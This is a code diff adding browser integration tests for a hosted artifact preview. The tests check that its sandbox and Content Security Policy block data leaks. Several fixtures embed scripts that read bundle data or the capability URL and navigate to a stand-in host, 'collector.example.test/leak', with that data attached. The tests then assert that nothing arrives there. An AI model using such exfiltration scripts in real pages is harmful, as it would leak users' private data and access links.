@@ -4,9 +4,12 @@ import os
 from pathlib import Path
 
 import pytest
-from playwright.sync_api import Browser, expect
+from playwright.sync_api import Browser, Route, expect
 
 from artifact_studio.artifacts import ArtifactStore
+from artifact_studio.models import SlidePatch
+from artifact_studio.storage import digest
+from tests.design_factory import TEMPLATE_ID, make_design
 from tests.integration.hosted_fixture import WORKSPACE, routed_hosted_context, running_hosted_app
 
 pytestmark = [
@@ -160,3 +163,172 @@ def test_expiry_clears_open_connection_and_preserves_review_page(
         expect(dialog.locator("[data-copy-mcp]")).to_be_disabled()
         expect(dialog.locator("[data-hub-setup]").last).to_be_hidden()
         expect(dialog.get_by_role("button", name="Sign in again")).to_be_visible()
+
+
+@pytest.mark.parametrize("shell", ["/", "/web/hub.html"])
+def test_hosted_bundle_navigation_stays_offline(
+    browser: Browser, tmp_path: Path, artifacts: Path, shell: str
+) -> None:
+    """Allow relative pages while blocking data/capability exfiltration from every shell."""
+    bundle = tmp_path / "bundle"
+    (bundle / "nested").mkdir(parents=True)
+    (bundle / "index.html").write_text('<a href="nested/page.html">Open nested page</a>')
+    (bundle / "nested/data.txt").write_text("FICTIONAL_PRIVATE_BUNDLE_DATA")
+    (bundle / "nested/page.html").write_text("""<!doctype html>
+        <h1>Nested page</h1><a href="../index.html">Back to start</a>
+        <button id="leak" disabled>Attempt external navigation</button><script>
+        fetch('data.txt').then(r=>r.text()).then(data=>{
+          document.querySelector('#leak').disabled=false;
+          document.querySelector('#leak').onclick=()=>location.replace(
+            'https://collector.example.test/leak?data='+encodeURIComponent(data)+
+            '&cap='+encodeURIComponent(location.href));
+        });</script>""")
+    with running_hosted_app(tmp_path / "hosted", artifacts / "server.log") as app:
+        registry = ArtifactStore(app.store)
+        project = registry.create_project("Fictional navigation fixture")
+        artifact = registry.register_artifact(
+            project.id, "Navigation fixture", bundle, "index.html"
+        )
+        with routed_hosted_context(browser, app) as context:
+            collected: list[str] = []
+
+            def collect(route: Route) -> None:
+                collected.append(route.request.url)
+                route.fulfill(status=200, body="Fictional collector")
+
+            context.route("https://collector.example.test/**", collect)
+            page = context.new_page()
+            page.goto(f"{WORKSPACE}{shell}?artifact={artifact.id}")
+            frame = page.frame_locator("#hub-html-preview")
+            frame.get_by_role("link", name="Open nested page").click()
+            expect(frame.get_by_role("heading")).to_have_text("Nested page")
+            # Raw pages remain unbridged: selectors cannot be attributed to the entrypoint.
+            assert frame.locator("script[data-artifact-root]").count() == 0
+            frame.get_by_role("link", name="Back to start").click()
+            frame.get_by_role("link", name="Open nested page").click()
+            expect(frame.locator("#leak")).to_be_enabled()
+            with page.expect_console_message(
+                predicate=lambda message: (
+                    "collector.example.test" in message.text
+                    and "Content Security Policy" in message.text
+                )
+            ):
+                frame.locator("#leak").click()
+            assert collected == []
+            warning = page.locator("#hub-preview-warning")
+            expect(warning).to_contain_text("Preview navigation was blocked")
+            warning.get_by_role("button", name="Reload preview").click()
+            expect(warning).to_be_hidden()
+            expect(frame.get_by_role("link", name="Open nested page")).to_be_visible()
+
+
+def test_hosted_preview_bridge_uses_workspace_parent(
+    browser: Browser, tmp_path: Path, artifacts: Path
+) -> None:
+    """Select authored content through the real UI after scripts move to the preview host."""
+    bundle = tmp_path / "bundle"
+    bundle.mkdir()
+    (bundle / "index.html").write_text('<h1 id="heading">Fictional selection target</h1>')
+    with running_hosted_app(tmp_path / "hosted", artifacts / "server.log") as app:
+        registry = ArtifactStore(app.store)
+        project = registry.create_project("Fictional selection fixture")
+        artifact = registry.register_artifact(project.id, "Selection fixture", bundle, "index.html")
+        with routed_hosted_context(browser, app) as context:
+            page = context.new_page()
+            page.goto(f"{WORKSPACE}/?artifact={artifact.id}")
+            frame = page.frame_locator("#hub-html-preview")
+            expect(frame.locator("#heading")).to_be_visible()
+            page.locator('[data-action="select"]').click()
+            frame.locator("#heading").click()
+            expect(page.locator("#hub-targets")).to_contain_text("Fictional selection target")
+
+
+@pytest.mark.parametrize("filename", ["page.html", "active.svg"])
+def test_hosted_capability_documents_download_without_parent(
+    browser: Browser, tmp_path: Path, artifacts: Path, filename: str
+) -> None:
+    """A signed resource opened as a tab must not execute outside the parent frame policy."""
+    bundle = tmp_path / "bundle"
+    bundle.mkdir()
+    (bundle / "index.html").write_text("<h1>Fictional download fixture</h1>")
+    payload = "location.replace('https://collector.example.test/leak')"
+    (bundle / "page.html").write_text(f"<script>{payload}</script>")
+    (bundle / "active.svg").write_text(
+        f'<svg xmlns="http://www.w3.org/2000/svg"><script>{payload}</script></svg>'
+    )
+    with running_hosted_app(tmp_path / "hosted", artifacts / "server.log") as app:
+        registry = ArtifactStore(app.store)
+        project = registry.create_project("Fictional capability fixture")
+        artifact = registry.register_artifact(project.id, "Download fixture", bundle, "index.html")
+        with routed_hosted_context(browser, app) as context:
+            collected: list[str] = []
+
+            def collect(route: Route) -> None:
+                collected.append(route.request.url)
+                route.fulfill(status=200, body="Fictional collector")
+
+            context.route("https://collector.example.test/**", collect)
+            page = context.new_page()
+            page.goto(f"{WORKSPACE}/?artifact={artifact.id}")
+            frame = page.frame_locator("#hub-html-preview")
+            expect(frame.get_by_role("heading")).to_be_visible()
+            resource = frame.locator("head").evaluate("e=>e.ownerDocument.baseURI") + filename
+            page.evaluate(
+                """url=>{
+                const link=document.createElement('a');link.id='direct-capability';
+                link.href=url;link.textContent='Open resource directly';document.body.append(link);
+            }""",
+                resource,
+            )
+            with page.expect_download() as download:
+                page.locator("#direct-capability").click()
+            assert download.value.suggested_filename == filename
+            assert page.url.startswith(WORKSPACE)
+            assert collected == []
+
+
+@pytest.mark.parametrize("endpoint", ["audience", "exports/pdf"])
+def test_hosted_audience_keeps_authored_scripts_behind_offline_parent(
+    browser: Browser, tmp_path: Path, artifacts: Path, endpoint: str
+) -> None:
+    """Top-level export viewers retain the runtime's independent nested sandbox."""
+    with running_hosted_app(tmp_path / "hosted", artifacts / "server.log") as app:
+        make_design(app.store.root / TEMPLATE_ID)
+        deck = app.store.create("2026-11-08-hosted-audience", "Fictional audience", "test-brand")
+        slide = deck.slides[0]
+        app.store.revise(
+            deck.id,
+            slide.id,
+            digest(slide.model_dump_json()),
+            "hosted-offline-slide",
+            SlidePatch(
+                interactive_html="""<button id="attempt">Attempt navigation</button>
+            <script>document.querySelector('#attempt').onclick=()=>location.replace(
+              'https://collector.example.test/leak?data=FICTIONAL_AUDIENCE_CONTENT');</script>"""
+            ),
+        )
+        with routed_hosted_context(browser, app) as context:
+            collected: list[str] = []
+
+            def collect(route: Route) -> None:
+                collected.append(route.request.url)
+                route.fulfill(status=200, body="Fictional collector")
+
+            context.route("https://collector.example.test/**", collect)
+            page = context.new_page()
+            page.goto(f"{WORKSPACE}/api/decks/{deck.id}/{endpoint}")
+            selector = (
+                "#stage .runtime-slide-canvas > iframe"
+                if endpoint == "audience"
+                else ".print-page iframe"
+            )
+            frame = page.frame_locator(selector).first.frame_locator("iframe")
+            expect(frame.locator("#attempt")).to_be_visible()
+            with page.expect_console_message(
+                predicate=lambda message: (
+                    "collector.example.test" in message.text
+                    and "Content Security Policy" in message.text
+                )
+            ):
+                frame.locator("#attempt").click()
+            assert collected == []
